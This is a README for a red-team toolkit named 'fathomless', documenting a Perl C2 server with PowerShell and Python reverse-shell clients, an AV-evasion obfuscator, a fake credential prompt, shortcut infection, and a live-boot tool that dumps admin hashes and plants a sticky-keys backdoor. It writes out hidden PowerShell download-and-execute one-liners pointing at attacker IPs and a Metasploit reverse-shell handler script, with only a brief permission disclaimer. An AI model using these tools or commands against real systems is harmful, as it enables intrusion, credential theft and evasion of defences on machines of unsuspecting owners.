# fathomless

A collection of tools personalized for red teams but also useful for pen testers.

* Modified linux distro that is effective on Win 7 partitions and pre UEFI Systems.
* Custom HTTPS capable C2 server uses a cgi written in Perl and reverse shell clients written in Powershell / Python.
* Simple Windows script obfuscator for AV evasion, uses a polyalphabetic cipher to alter b64 encoding.


## IAC2

This is an upgrade of sorts to the async-shell-handler.

```
Short for inital access c2 server, the idea behind this is the first c2 to make contact.
use this to filter targets that are any worth.

server side: 

iaa-monitor.pl -> perl cgi app
cli_shell.pl   -> interactive shell in perl 

This was made to work with Debian/Ubuntu server distro (tested in Debian 8). After a 
clean install just run setup-iac2.sh to setup. 

Once setup run the cli_shell.pl to interact with any systems that have executed
client code on them.

It's light weight, has simple clients and uses a lighttpd server, no databases are 
required so you can set it up and tear it down without difficulty.

These are the two client's:

initial-access-agent.ps1 -> client in powershell
initial-access-agent.py  -> client in python 

You can compile the powershell using ps2exe to a binary if you wish but try to run it
in memory.

the python version is a work in progress, you should be able to complie using pyinstaller,
py2exe or py2app etc.

There is basic OS detection and it will be shown through the cli_shell.pl script. 
Use caution on your command input since you have direct shell access via subprocess.Popen()

```

## async-shell-handler
asynchronous multi-shell handler

Includes a server side cgi application and a powershell client.
It performs handeling of systems that have executed the async-client
script. This allows the individual running the server hosting the
cgi to enter shell commands to be executed by clients asynchronously.

The information is exchanged in an encoded format, the secure nature
directly relies upon the use of SSL/TLS.

## Install

Developed for use on a regular Ubuntu 14.04 LTS server distro.
To get it working run the installer as root.

```
 ./install.sh
```

## use

The info of individual systems is stored in /var/async-shell/systems and is 
assigned to www-data as owner and group.

### cli.pl

This provides a basic command shell to interact with systems running
the client.

To have the server host powershell scripts to be loaded using the exec-script
function place them in /var/async-shell/ps-scripts with to correct permissions
www-data as owner and group.

Additional functions have been added to the client that can be called within 
a shell session.

* show-help                                              
shows the following function info from a shell session. 

* get-info                       
Displays a summary of current host

* exec-script "name-of-script"  
Executes script hosted server side in /var/async-shell/ps-scripts by IEX 
requires the name of the script filename as a parameter.

* obfuscate "name of text file / script"                                    
Uses a polyalphabetic obfuscation method on base64 strings writes obfuscated
string to file and provides a de-obfuscation key.

* de-obfuscate "(name of text file / script), (key)"                            
Performs the inverse of the obfuscation function requires the text file with the
obfuscated base64 data and de-obfuscation key as parameters.

* gen-key                                                                      
generates a random alphabetic string for use with the obfuscate-base64 function.

* obfuscate-base64 "(action:hide or clear ), (key: obfuscation or de-ofuscation), (base64-string)"
The function that contains the obfuscation engine, it works only with clear base64 data.

* byte-encode ( binary-to-obfuscate, key )                                                
Performs byte-encoding prior to converting to obfuscated base64 provide key de-obfuscation.

* byte-decode ( file-containing-obfu-base64, key )                                    
performs the reverse of byte-encode, requires the de-obfuscation key.

* askfor-creds                                                                         
Performs some social engineering inorder to aquire plain-text credentials. This is done
by generating a authentication popup which seems to reconnect to a network share.

* gen-enccmd "your command string"                                                  
Generates a PowerShell formatted encoded command. Insure to quote your command
string.

```
gen-enccmd "cmd /c ipconfig /all"
```

* shortcut-inject "name-of-lnk" "Url-hosting-script"                                   
Modifies the specified shortcut to run the original program and also execute a download
and execute command string. Ex: "Google Chrome.lnk" "http://some-doman[.]com/hello.ps1" 
Requires the http:// or https:// in the URL.


### caveats
Depending on your command structure and use of special characters you may need
to encapsulate your command string in a variable before passing to this function.
```
$cmdstring = 'cmd /c ipconfig /all' ; gen-enccmd $cmdstring
```

* dec-enccmd [Your encoded command string ]
Decodes the base64 string and displays the original string.

Note: depending on the command executed by the client there may be no
stdout, this will leave the client hanging expecting a response and you 
will have to restart it to reset it.

to use just run
```
./cli.pl
```
to exit ctrl-c

If you feel this is a bit too unpredictable you will have to 
use echo and tail.

```
null-pc www # ls -l /var/
drwxr-xr-x  2 www-data www-data 4096 Sep 15 00:22 systems
```

Inside this folder will contain the hostname of the machine runing the
powershell client script.

This will create a folder named after the hostname and it's mac
address.

```
null-pc systems # ls -l
drwxr-xr-x 2 www-data www-data 4096 Sep 15 00:46 ZERO-PC-08-00-27-30-15-25
```

In this folder will be two files named command and stdout. Their names 
denote their purpose.

```
null-pc ZERO-PC-08-00-27-30-15-25 # ls -l
-rw-r--r-- 1 www-data www-data  7 Sep 15 00:46 command
-rw-r--r-- 1 www-data www-data 15 Sep 15 00:46 stdout
null-pc ZERO-PC-08-00-27-30-15-25 # echo 'dir' > command 
null-pc ZERO-PC-08-00-27-30-15-25 # tail -f stdout 

    Directory: C:\Users\zero\Desktop


Mode                LastWriteTime     Length Name                                                                           
----                -------------     ------ ----                                                                           
-a---         9/17/2015   6:14 PM      11378 basic-macro-test.docx                                                 
-a---         9/17/2015   6:58 PM      11376 test-self-signed-iex.docx                                                        
```
Created to be used along with gen-obfuscated

For more info http://fathomlessproject.com/asynchronous-shell-handler/


## b64 tcp client 

Provides a variant of the tcp powershell client that encodes the TCP traffic with custom base64 
encoding. This should help evade some IDS egress detection methods without having to resort 
to using SSL, Webserver, C2, blah, blah, blah...

Just a system that can run Perl :D 

To use start the Perl listener [->] ./b64-tcp-handler.pl [ specify port to listen on ]

Edit the b64-tcp-client.ps1 script, see below 

```
      ##################[ CONFIG CONNECTION ]####################

	       #[->] Enter the ip address and port information here

	      $IPAddress = '192.168.0.15'  # [->] Change this example
	      $Port = '443'        	       # [->] Change this example 

      ###########################################################

```

Get the client to execute on target system somehow, "gen-obfuscated" and wait for your shell.


## gen-obfuscated

### Generate Obfuscated Code
This is a simple perl program that generates obfuscated vbs/vba code
for use in passing a command to cmd /c while bypassing AV.

To set the options you will need to edit the .pl file directly this is not just a
simple program with preset payloads. It's designed to take in any
type of one-liner you can think of passing to "cmd.exe /c".

Made to be used along with the async-client powershell script, but any one-liner
that get's you a shell should work.

Generated Output of an obfuscated command string:

![generated output](http://fathomlessproject.com/pics/string-obfuscation-1.png)


The hash value of the resulting code with the same command string will alter upon 
each run.

![generated hash](http://fathomlessproject.com/pics/string-obfuscation-2.png)


### UPDATE
Now has an interactive user prompt just run it from the terminal.

```
./gen-obfuscated.pl
```
The below can still give you ideas of what commands to run and should help you get started.

```
gen-obfuscated.pl

##[  Options ]
#
# The options are included inside due to the tricky nature of escaping powershell code passed as an
# argument from the bash shell, also I don't need too since now the commands are directly taken from the
# user interactively.

##[ Script Type to generate ]
#
# 1 for vbscript
# 2 for vba macro ---> EXPERIMENTAL large macros can be generated affects still unknown...
# 3 for hta script
#
##[ Encode Your IEX? ]
#
# base64 encoding in Powershell, set to false if you already have a base64 encoded payload or
# you want your iex only obfuscated by ascii code.
#
##[ PowerShell IEX ]
#
# The command you wish to be base64 encoded
# iex (New-Object -ComObject Wscript.Shell).Popup('IEX Decoded and Executed!',0,'Done',0x1)
#
# If you already have a powershell command with encoding, for example this can also be used with the 
# alphanumeric shellcode injector payload generated by the setoolkit, I warn you this will create a 
# very long script upwards of 350 lines...
#
# cmd /c powershell -w hidden -enc <-base64 encoded string-> 
#
# Only use ascii chr function obfuscation
# cmd /c powershell -w hidden -c iex (New-Object System.Net.WebClient).DownloadString('http://192.168.1.110/rvs-sh')
#
# OR
#
# A one-liner that supports a dowloadstring from a https site with a self-signed cert.
# cmd /c powershell.exe -w hidden -c "&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};iex(New-Object System.Net.Webclient).DownloadString('https://192.168.0.15/client')}"
#
# OR
#
# A command that produces a popup, for testing only using ascii chr function obfuscation
# cmd /c powershell -w hidden -c iex (New-Object -ComObject Wscript.Shell).Popup('IEX Decoded and Executed!',0,'Done',0x1););
#
# OR
#
# A command using javascript to pass commands directly to mshta, for maximum effect use script type 3
# cmd /c mshta "javascript:var sh=new ActiveXObject( 'WScript.Shell' ); sh.Popup( 'Javascript decoded and Executed', 15, 'From gen-obfuscated', 64 );close()");
#
# Be Creative...

```

Enables execution of a command string on systems while evading countermeasures, specifically AV signature based detection. This is accomplished by focusing on obfuscating command strings that typically download a short script involved in first-stage/initial access.

So an example execution chain would be:
```
[command string downloader (gen-obfuscated)] -> [remote stager script (async-client)] -> [load payloads; shellcode, dll's, other ps1 scripts]
```

Ideally most code should be loaded and executed in memory only.

This code is not made to make reverse engineering impossible or even slow it down. It's specific purpose is to evade automated signature based detection. Is this even a problem to respond to in the first place? Is it just your paranoia? Do you even know?

Currently supported methods.
* vbscript 
* vba macros
* hta
* jscript vba macro execution

##### target environment for use

gen-obfuscated and the async-client mainly use native Windows interpreted languages. This was done to increases the chance of success on systems with more strict host security. The evasion of egress security is the reason for the use of randomization, HTTPS and modded base64 string encoding for comms. (yrmv, test/modd/test/etc...)

Obviously there is a social engineering aspect to this that is required, this I leave to you (maybe not).


## PSobfuscator

The result of porting some functionality from gen-obfuscated into the powershell clients.
Made to run from a windows systems to generate payloads without needing to use the 
powershell clients/implants.These are those functions, plus some original content in 
a stand alone version that can be run from windows to generate payloads to get 
initial access.

The obfuscation engine is ported but the only supported methods currently are 
vbscript, vba macros and lnk files along with other obfuscation techniques.

This is not complete and the under utilized functions will be expanded upon, or you can
do you own thing and not have to wait.

Available functions.

### simple-downloader "Url-hosting-script" 
Generates an obfuscated vbs script that will download and execute 
a powershell script. After execution it rewrites itself into a txt 
file with bogus info and opens in notepad.

### looping-stager "Url-hosting-script" 
Generates a command string for use kicks 
of a looping downloader.

### gen-shorcut "Url-hosting-script" 
Creates a shortcut that downloads and executes the script found in the 
provided url.
	

### shortcut-infect "name-of-lnk" "Url-hosting-script" 
Modifies the specified existing shortcut to run the original program 
and also execute a download and execute command string. 
	
   example: 
   ```
   shortcut-infect "Google Chrome.lnk" "http://some-doman[.]com/hello.ps1" 
   ```
   requires the http:// or https:// in the URL.

Only run this on the target system.

### obfuscate "name of text file / script"
Uses a polyalphabetic obfuscation method on base64 strings writes 
obfuscated string to file and provides a de-obfuscation key.


### de-obfuscate "name of text file / script" "key" 
Performs the inverse of the obfuscation function requires the text 
file with the obfuscated base64 data and de-obfuscation key as parameters.


### gen-key
generates a random alphabetic string for use with the obfuscate-base64 
function.


### obfuscate-base64 "(action:hide or clear ), (key: obfuscation or de-ofuscation), (base64-string)" 
The function that contains the obfuscation engine, it works only 
with clear base64 data. It's UTF8 so do not use this for 
powershell encoded commands.


### byte-encode "binary-to-obfuscate" "key" 
Performs byte-encoding prior to converting to obfuscated base64 
provide key de-obfuscation.


### byte-decode "file-containing-obfu-base64" "key" 
performs the reverse of byte-encode, requires the de-obfuscation key.


### gen-enccmd "your command string"
Generates a PowerShell formatted encoded command. Insure to quote 
your command string.
	
   example: gen-enccmd "cmd /c ipconfig /all"

### dec-enccmd "Your encoded command string" 
Decodes the base64 string and displays the original string.


IMPORTANT !!!
Be sure to dot source this script or iex to import these function 
into your current powershell session for this to work.

example: 
```
PS C:\>	. .\PSobfuscator.ps1
```




## The boot2own toolkit

B2O is a toolkit that generates a live OS from a crunchbang 
iso. When a workstation is booted to this live environment 
it's hard drive is mounted and the NTLM hash of the 
local admin (RID 500) is extracted. The admin hash is then 
leveraged in attacks against a Windows domain network using a
patched winexe binary.

Used crunchbang-11-20130506-i686.iso successfully to
generate liveCD.

Used Ubuntu Server x86 12.04 successfully to compile patched winexe
So use Ubuntu Server/Desktop x86 12.04 to compile binary for i686 
crunchbang iso.

Confirmed working on Windows 7 only.

### todo
* Add Plop boot manager to PXE generation script.
* have Ramboot/Copy2ram functionality to generated iso, to aid live USB function.
* Add additonal payloads
* Add UEFI support (meaning there is no current UEFI support)

### Demo
The following link has a demo iso that was generated with this kit.
Don't take my word for it and test it in a Windows VM that is apart
of a virtualized test domain.

[Get demo here](http://www.mediafire.com/download/x18jv9h8voxh7jl/boot2own-demo.iso).

create an issue through github if you have any problems.

### Video
Watch it in HD to see the details.

[![video hosted on youtube here](http://img.youtube.com/vi/vUvku_CwKT0/hqdefault.jpg)](https://www.youtube.com/embed/vUvku_CwKT0?autoplay=1&vq=hd720)

### Build Scripts
Run these scripts inside the boot2own/ folder to prevent
any odd issue from appearing.
* b2o-compile.sh - compiles a patched winexe binary
* b2o-isogen.sh  - generates the live environment from a CrunchBang iso
* b2o-pxe.sh     - sets up a pxe server using the newly generated iso

### Compile winexe
Insure that you are using a x86 Ubuntu 12.04 / Crunchbang computer for 
compiling winexe for the x86 LiveCD. 

First you need to compile a patched winexe version that allows 
hash passing. Use the following script inside the boot2own-1.0 folder.
```
 usage : ./b2o-compile.sh 
```
If you already have a copy of smbexec installed, rename a 
copied smbwinexe to pwinexe and place it in.

boot2own/live-files/boot-2-own/pwinexe

Note: a x64 binary will not work.

### Generate iso image
To generate a boot2own liveCD for yourself you will need to have 
a copy of a Crunchbang iso. The build scripts have been sucessfully 
tested on image crunchbang-11-20130506-i686.iso  

to generate the boot2own live OS from the crunchbange iso use
the following script with the CB iso as an argument.
```
 usage: ./b2o-isogen.sh crunchbang-11-20130506-i686.iso
```
This will remaster the crunchbang iso to become the b2o live OS.
the iso will be saved to boot2own/b2o-remaster/boot2own.iso


### PXE Server
sets up a pxe server on a Beagle Bone black, 
Raspberry Pi or any hardware that has a Debian based OS.
The script installs syslinux, dnsmasq and configures it to run 
as a PXE server. It then extracts the needed files from the 
boot2own.iso image file in order to boot it with PXE over a LAN.

It is preferable to use a device that has a gigabit Ethernet port.

To install run as ROOT
```
 ./b2o-pxe.sh boot2own.iso
```
Default network settings in b2o-pxe.sh

eth0    10.0.0.1
netmask 255.255.255.0

### Live Environment Options

Tested on hard drives with Windows 7 installed. 
* If the hard drive is encrypted B2O will fail. 
* If no Windows file system is detected the LiveCD OS will power off.

Boot computer by USB/CD/PXE
You will then be presented with the following options.

### [1] Sethc Backdoor
This option overwrites sethc.exe with cmd.exe, 
known as the sticky keys bypass. This enables one to 
activate a system cmd prompt when pressing the Shift 
keys 5 times at the Windows login screen. To reverse 
the process just run this option again on the same 
computer.

### [2] Mimikatz
Option named after the program Mimikatz. It is delivered 
using a PowerShell script "Invoke-Mimikatz" (part of the 
PowerSploit toolkit) that loads the program reflectively 
into memory and then executes it, giving you clear text 
credentials. For more info read the contents of 
boot2own/live-files/pld2, also visit the program authors 
blog and the Github repo that host PowerSploit(read ABOUT CREDITS-B2O). 
The Output from this option is stored in a file [ /root/loot ] 

### [3] Invoke-Shellcode
A script that is apart of PowerSploit toolkit, executes 
a reverse https meterpreter shell back to the specified IP 
or domain. For this to work you will need to use the 
MetaSploit Framework to have a multi handler ready and 
waiting for a connection.

Setting up the multi handler:

Use an metasploit rc script

```
use multi/handler
set payload windows/meterpreter/reverse_https
set LHOST "YOUR IP OR DOMAIN" 
set LPORT 443
set ExitOnSession false
set AutoRunScript post/windows/manage/system_migrate
exploit -j
```
execute this file 
msfconsole -r listener.rc       

Note : system_migrate
system_migrate is a modified version of smart_migrate, it's 
priority is to migrate out of powershell to an existing 
SYSTEM/NT AUTHORITY process to maintain this permissions level. 
If this is not done The patched winexe process will hang as 
powershell remains active.

to get this moded module working copy system_migrate.rb to

metasploit-framework/modules/post/windows/manage/

Do not forget to check permissions.

b2o-listener.sh 
Optional - if you already have the metasploit-framework 
installed and it is in your terminals PATH along with 
having the system_migrate.rb in the appropriate directory. 
You can use this shell script to start MSF and drop 
you directly into a multi handler configured to 
receive shells from b2o's option 3.
```
usage : ./b2o-listener.sh lhost-IP
```
Note : Invoke-Shellcode
For author info and program details read the ABOUT 
and CREDITS-B2O.

Note : Proxies
SYSTEM will ignore IE proxy settings so if a network uses 
a web application proxy (has good egress filtering)
you will not get your shell and may possibly hang up 
a B2O execution run.


### [4] PS URL
This option passes a powershell command string that downloads 
the contents of a target url to a powershell variable and 
then invokes the variable contents as an expression "IEX". 
This can be leveraged by your own custom powershell script 
that you wish to be executed remotely there is no need to 
enable remoting as you are passing the parameters 
through the patched winexe program.

### [5] Windows cli
This option passes a command that is executed directly by 
winexe on victim machines, this option is whatever you make it.

### [6] Show Credits
Shows Credits

### [7] Shut Down Live session
Self explanitory

### exfil

For the payload options [ 2 - 5 ]
the output/result of each successful execution run is saved in a file

located: /root/loot (in the Live OS)
how to exfil it, is up to you.

For ideas look at my git repo black-hole.


##### Use only with permission from network owners (make sure it's in writing). 

#### Might? todo?

* add pdf/usb vector to gen-obfuscated.
* add the ability to reflectively load binaries/dll's.
